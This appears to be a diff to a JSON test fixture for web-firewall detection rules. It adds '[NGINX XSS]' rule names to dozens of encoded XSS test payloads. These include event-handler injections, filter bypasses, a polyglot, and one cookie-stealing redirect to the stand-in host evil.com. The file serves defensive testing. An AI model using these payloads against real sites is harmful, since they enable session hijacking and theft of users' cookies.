@@ -15,7 +15,8 @@
       "encoded": "%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_REFL_002",
@@ -26,7 +27,8 @@
       "encoded": "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_REFL_003",
@@ -37,7 +39,8 @@
       "encoded": "%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_REFL_004",
@@ -48,7 +51,8 @@
       "encoded": "%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_REFL_005",
@@ -59,7 +63,8 @@
       "encoded": "%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_REFL_006",
@@ -70,7 +75,8 @@
       "encoded": "%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] Polyglot XSS Attack"
     },
     {
       "id": "XSS_REFL_007",
@@ -81,7 +87,8 @@
       "encoded": "%3Cselect%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] Polyglot XSS Attack"
     },
     {
       "id": "XSS_REFL_008",
@@ -92,7 +99,8 @@
       "encoded": "%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] Polyglot XSS Attack"
     },
     {
       "id": "XSS_REFL_009",
@@ -103,7 +111,8 @@
       "encoded": "%3Ckeygen%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] Polyglot XSS Attack"
     },
     {
       "id": "XSS_REFL_010",
@@ -114,7 +123,8 @@
       "encoded": "%3Cvideo%3E%3Csource%20onerror%3Dalert%28%27XSS%27%29%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_REFL_011",
@@ -125,7 +135,8 @@
       "encoded": "%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_REFL_012",
@@ -136,7 +147,8 @@
       "encoded": "%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] Polyglot XSS Attack"
     },
     {
       "id": "XSS_REFL_013",
@@ -147,7 +159,8 @@
       "encoded": "%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_REFL_014",
@@ -158,7 +171,8 @@
       "encoded": "%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_REFL_015",
@@ -169,7 +183,8 @@
       "encoded": "%3Cobject%20data%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_ENC_001",
@@ -180,7 +195,8 @@
       "encoded": "%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_ENC_002",
@@ -191,7 +207,8 @@
       "encoded": "%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_ENC_003",
@@ -202,7 +219,8 @@
       "encoded": "%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_DOM_001",
@@ -213,7 +231,8 @@
       "encoded": "document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_002",
@@ -224,7 +243,8 @@
       "encoded": "innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_003",
@@ -235,7 +255,8 @@
       "encoded": "eval('alert(document.domain)')",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_BYPASS_001",
@@ -246,7 +267,8 @@
       "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_MUT_001",
@@ -257,7 +279,8 @@
       "encoded": "%3Cnoscript%3E%3Cp%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E%22%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_POLY_001",
@@ -268,7 +291,8 @@
       "encoded": "javascript%3A%2F*--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D'%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2Balert('XSS')%3B%2F%2F'%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "critical"
+      "severity": "critical",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_STORED_001",
@@ -279,7 +303,8 @@
       "encoded": "%3Cscript%3Ealert('Stored%20XSS')%3C%2Fscript%3E",
       "port": 8002,
       "expected_detection": true,
-      "severity": "critical"
+      "severity": "critical",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_004",
@@ -290,7 +315,8 @@
       "encoded": "innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E'",
       "port": 8002,
       "expected_detection": true,
-      "severity": "high"
+      "severity": "high",
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_MUT_002",
@@ -302,7 +328,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Polyglot XSS Attack"
+      "expected_rule": "[NGINX XSS] Polyglot XSS Attack"
     },
     {
       "id": "XSS_MUT_003",
@@ -314,7 +340,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_MUT_004",
@@ -326,7 +352,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Advanced XSS Attack Attempt"
+      "expected_rule": "[NGINX XSS] Advanced XSS Attack Attempt"
     },
     {
       "id": "XSS_MUT_005",
@@ -338,7 +364,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Polyglot XSS Attack"
+      "expected_rule": "[NGINX XSS] Polyglot XSS Attack"
     },
     {
       "id": "XSS_DOM_005",
@@ -350,7 +376,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_006",
@@ -362,7 +388,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "critical",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_007",
@@ -374,7 +400,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_008",
@@ -386,7 +412,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_009",
@@ -398,7 +424,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_010",
@@ -410,7 +436,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_BYPASS_002",
@@ -422,7 +448,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_BYPASS_003",
@@ -434,7 +460,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_BYPASS_004",
@@ -446,7 +472,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_BYPASS_005",
@@ -458,7 +484,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_BYPASS_006",
@@ -470,7 +496,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_BYPASS_007",
@@ -482,7 +508,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt"
     },
     {
       "id": "XSS_BYPASS_008",
@@ -494,7 +520,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_BYPASS_009",
@@ -506,7 +532,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_BYPASS_010",
@@ -518,7 +544,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "XSS Filter Bypass Attempt"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_011",
@@ -530,7 +556,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_012",
@@ -542,7 +568,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_013",
@@ -554,7 +580,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_014",
@@ -566,7 +592,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_DOM_015",
@@ -578,7 +604,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "DOM-based XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_POLY_002",
@@ -590,7 +616,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Polyglot XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_POLY_003",
@@ -602,7 +628,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Polyglot XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_POLY_004",
@@ -614,7 +640,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Polyglot XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_POLY_005",
@@ -626,7 +652,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Polyglot XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_POLY_006",
@@ -638,7 +664,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Polyglot XSS Attack"
+      "expected_rule": "[NGINX XSS] DOM-based XSS Attack"
     },
     {
       "id": "XSS_POLY_007",
@@ -650,7 +676,7 @@
       "port": 8002,
       "expected_detection": true,
       "severity": "high",
-      "expected_rule": "Advanced XSS Attack Attempt"
+      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
     }
   ]
 }
